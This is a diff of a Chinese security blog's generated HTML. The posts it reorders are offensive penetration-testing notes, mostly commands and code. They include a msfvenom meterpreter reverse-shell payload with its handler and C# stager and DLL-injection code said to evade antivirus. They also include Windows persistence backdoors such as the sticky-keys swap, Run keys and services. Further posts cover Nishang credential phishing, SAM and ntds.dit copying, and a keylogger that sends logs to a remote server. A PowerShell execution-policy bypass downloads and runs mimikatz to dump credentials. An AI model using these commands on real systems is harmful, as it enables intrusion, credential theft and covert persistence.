@@ -373,7 +373,7 @@
 <pre><code>openssl genrsa&gt;privkey.pem    //生成密钥
 openssl req -new -x509 -key privkey.pem -out cert.pem -days 365    //用生成的密钥生成证书
 twistd -n web -c cert.pem -k privkey.pem --https=8080    //监听8080的web服务</code></pre><p>0x02</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f exe -o demo.exe    //生成一个https的程序·。</code></pre><p>然后将这个程序下载到Win下运行，第一步监听8080的web服务就会捕捉到一个https请求的日志。<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/01.png)<br> 将这个请求复制到lab2的2.cs中</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f exe -o demo.exe    //生成一个https的程序·。</code></pre><p>然后将这个程序下载到Win下运行，第一步监听8080的web服务就会捕捉到一个https请求的日志。<br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/01.png" alt="avatar"><br> 将这个请求复制到lab2的2.cs中</p>
 <pre><code> using System.Net;
  using System.Text;
  using System.Configuration.Install;
@@ -427,7 +427,7 @@ public static void Stager(string url)
 }
 }</code></pre><p> 编译程序，然后msf开启监听，运行即返回session。</p>
 <pre><code>C:\windows\microsoft.net\framework\v4.0.30319\csc.exe 2.cs    //编译程序
-handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //msf开启监听</code></pre><p> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/02.png)</p>
+handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //msf开启监听</code></pre><p> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/02.png" alt="avatar"></p>
 <h1 id="lab3-lab4"><a href="#lab3-lab4" class="headerlink" title="lab3+lab4"></a>lab3+lab4</h1><blockquote>
 <p>最后结果：360，电脑管家过。<br>lab4 其实就是lab3的免杀版，通过对shellcode进行xor或aes加密来实现免杀.<br>windows defender一直没法pass,简单的修改加密的key值也无济于事。</p>
 </blockquote>
@@ -530,7 +530,7 @@ public static void Main()
 
 
 }
-}</code></pre><p>正常返回session<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/03.png)</p>
+}</code></pre><p>正常返回session<br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/03.png" alt="avatar"></p>
 <h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><blockquote>
 <p>测试结果：过360和电脑管家<br>lab6主要是dll注入，目前来说360和电脑管家对dll的查杀好像没那么强。<br>lab6的重点是将dll注入到一个已存在的进程中，使其逃避安全人员的检测。</p>
 </blockquote>
@@ -792,7 +792,7 @@ public static void Main()
     CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
  }
 }</code></pre><p>0x03</p>
-<p> 一个正常进程，返回了session。<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/04.png)<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/05.png)</p>
+<p> 一个正常进程，返回了session。<br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/04.png" alt="avatar"><br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/05.png" alt="avatar"></p>
 <h2 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h2><blockquote>
 <p>测试结果：全过。</p>
 </blockquote>
@@ -1195,7 +1195,7 @@ class UnmanagedExecute
     }
 }
 }</code></pre><p>0x02 </p>
-<pre><code>handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/06.png)<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/07.png)</p>
+<pre><code>handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/06.png" alt="avatar"><br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/07.png" alt="avatar"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
 <li><p>这个项目的免杀效果不错，在深层次的自定义后会更难被检测。</p>
 </li>
@@ -1206,7 +1206,7 @@ class UnmanagedExecute
 <li><p>感觉还是自己写加载器比较容易免杀，比如lab2那个加载器，根本不会遇到阻拦。</p>
 </li>
 <li><p>后期加壳对免杀有很大帮助，尤其是商业化的加壳工具。</p>
-<p>![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/08.png)</p>
+<p><img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/08.png" alt="avatar"></p>
 </li>
 </ul>
 
@@ -1443,7 +1443,7 @@ class UnmanagedExecute
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Windows权限维持笔记.</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
         
 
         <div class="post-meta">
@@ -1478,8 +1478,8 @@ class UnmanagedExecute
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/权限维持/" itemprop="url" rel="index">
-                    <span itemprop="name">权限维持</span>
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
                   </a>
                 </span>
 
@@ -1517,26 +1517,52 @@ class UnmanagedExecute
       
         
           
-            <h1 id="Windows权限维持笔记"><a href="#Windows权限维持笔记" class="headerlink" title="Windows权限维持笔记."></a>Windows权限维持笔记.</h1><p>在渗透的过程中及时留后门是一个好习惯，可以有效的避免一些意料之外的断连，毕竟断连后不一定还能再次拿下该主机。</p>
-<p>不过记得在达成目的后，及时删除后门。<br>PS：操作均为管理员权限下进行</p>
-<p><strong>Windows权限维持主要就是依靠自启动或者后门，</strong></p>
-<h2 id="自启动目录"><a href="#自启动目录" class="headerlink" title="自启动目录"></a>自启动目录</h2><pre><code>copy &quot;C:\beacon.exe&quot; &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\beacon.exe&quot; /y
-这目录里面的东西都会在开机登录入系统后启动。</code></pre><p>** 开机自启动 **</p>
-<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><pre><code>schtasks /create /tn demo /tr &quot;c:\beacon.exe&quot; /sc minute /mo 1
-创建一个名为demo的任务，任务内容为每分钟执行一次C盘根目录下的beacon.exe
-schtasks /delete /tn WindowsUpdate
-删除名为demo的任务</code></pre><p><strong>schtasks可以周期运行，重复检索任务是否处于运行状态，如果任务已经在执行不会重复执行。PS:schtasks可以深度定制。</strong></p>
-<h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><pre><code>takeown /f C:\windows\system32\sethc.* /a /r /d y&amp;&amp;cacls C:\windows\system32\sethc.exe /T /E /G system:F&amp;&amp;copy &quot;C:\beacon.exe&quot; C:\windows\system32\sethc.exe /y
-
-把粘滞键的启动程序改为后门程序。</code></pre><p><strong>要求能进入windows锁屏界面，且未关闭shift启动粘滞键，比如可以3389连过去或者能直接接触到。</strong></p>
-<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &quot;C:\beacon.exe&quot; /f
-
-reg add HKEY_CURRENT_USER\Environment\UserInitMprLogonScript /t REG_EXPAND_SZ /d C:\beacon.exe</code></pre><p>第二条启动先于杀软，注册表自启动路径很多，记几种常用的即可<br>** 开机自启动 **</p>
-<h2 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h2><pre><code>sc create &quot;demo&quot; binpath= &quot;C:\beacon.exe&quot;
-sc config &quot;demo&quot; start= auto
-创建一个名为demo的自启动服务，服务路径为C:\beacon.exe    </code></pre><p>** 开机自启动 **</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/07/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AC%94%E8%AE%B0/1.jpg" alt="avatar"></p>
-
+            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+</blockquote>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
+</ul>
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
           
         
       
@@ -1805,7 +1831,7 @@ Get-Keystrokes -LogPath c:\test.txt
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">cmd绕过空格过滤</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Windows权限维持笔记.</a></h1>
         
 
         <div class="post-meta">
@@ -1840,8 +1866,8 @@ Get-Keystrokes -LogPath c:\test.txt
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/杂项/" itemprop="url" rel="index">
-                    <span itemprop="name">杂项</span>
+                  <a href="/categories/权限维持/" itemprop="url" rel="index">
+                    <span itemprop="name">权限维持</span>
                   </a>
                 </span>
 
@@ -1879,17 +1905,25 @@ Get-Keystrokes -LogPath c:\test.txt
       
         
           
-            <h1 id="cmd绕过空格过滤"><a href="#cmd绕过空格过滤" class="headerlink" title="cmd绕过空格过滤"></a>cmd绕过空格过滤</h1><p>Ps：<strong>从大佬那里学的一点小技巧</strong></p>
-<p>Windows支持环境变量切片操作，可以切割出一个空格接上。</p>
-<blockquote>
-<p>set //查看环境变量</p>
-</blockquote>
-<blockquote>
-<p>net%CommonProgramFiles:~10,-18%user </p>
-<p> 意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user<br>既</p>
-</blockquote>
-<pre><code>CommonProgramFiles=C:\Program Files\Common Files
-net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br>** 经测试在win7,win10,win8,win2008,win2003,均有效</p>
+            <h1 id="Windows权限维持笔记"><a href="#Windows权限维持笔记" class="headerlink" title="Windows权限维持笔记."></a>Windows权限维持笔记.</h1><p>在渗透的过程中及时留后门是一个好习惯，可以有效的避免一些意料之外的断连，毕竟断连后不一定还能再次拿下该主机。</p>
+<p>不过记得在达成目的后，及时删除后门。<br>PS：操作均为管理员权限下进行</p>
+<p><strong>Windows权限维持主要就是依靠自启动或者后门，</strong></p>
+<h2 id="自启动目录"><a href="#自启动目录" class="headerlink" title="自启动目录"></a>自启动目录</h2><pre><code>copy &quot;C:\beacon.exe&quot; &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\beacon.exe&quot; /y
+这目录里面的东西都会在开机登录入系统后启动。</code></pre><p>** 开机自启动 **</p>
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><pre><code>schtasks /create /tn demo /tr &quot;c:\beacon.exe&quot; /sc minute /mo 1
+创建一个名为demo的任务，任务内容为每分钟执行一次C盘根目录下的beacon.exe
+schtasks /delete /tn WindowsUpdate
+删除名为demo的任务</code></pre><p><strong>schtasks可以周期运行，重复检索任务是否处于运行状态，如果任务已经在执行不会重复执行。PS:schtasks可以深度定制。</strong></p>
+<h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><pre><code>takeown /f C:\windows\system32\sethc.* /a /r /d y&amp;&amp;cacls C:\windows\system32\sethc.exe /T /E /G system:F&amp;&amp;copy &quot;C:\beacon.exe&quot; C:\windows\system32\sethc.exe /y
+
+把粘滞键的启动程序改为后门程序。</code></pre><p><strong>要求能进入windows锁屏界面，且未关闭shift启动粘滞键，比如可以3389连过去或者能直接接触到。</strong></p>
+<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &quot;C:\beacon.exe&quot; /f
+
+reg add HKEY_CURRENT_USER\Environment\UserInitMprLogonScript /t REG_EXPAND_SZ /d C:\beacon.exe</code></pre><p>第二条启动先于杀软，注册表自启动路径很多，记几种常用的即可<br>** 开机自启动 **</p>
+<h2 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h2><pre><code>sc create &quot;demo&quot; binpath= &quot;C:\beacon.exe&quot;
+sc config &quot;demo&quot; start= auto
+创建一个名为demo的自启动服务，服务路径为C:\beacon.exe    </code></pre><p>** 开机自启动 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/07/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AC%94%E8%AE%B0/1.jpg" alt="avatar"></p>
 
           
         
@@ -2458,163 +2492,6 @@ C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
-<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
-</blockquote>
-<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
-<li><p>本地绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
-<li><p>本地隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
-<li><p>本地导入ps1脚本，并执行函数.</p>
-<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
-<li><p>本地使用IEX下载远程ps1绕过执行.</p>
-<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
-<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
                 <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">BadUSB:虚假的恶意USB设备</a></h1>
         
 
@@ -2769,6 +2646,163 @@ Keyboard.end();//结束键盘通讯
 <p>HID：Human Interface Device的缩写，直接与人交互的设备，例如键盘、鼠标。</p>
 </blockquote>
 <p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
+<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
+</blockquote>
+<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
+<li><p>本地绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
+<li><p>本地隐藏绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
+<li><p>本地导入ps1脚本，并执行函数.</p>
+<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
+<li><p>本地使用IEX下载远程ps1绕过执行.</p>
+<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
+<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
+</li>
+</ul>
 
           
         
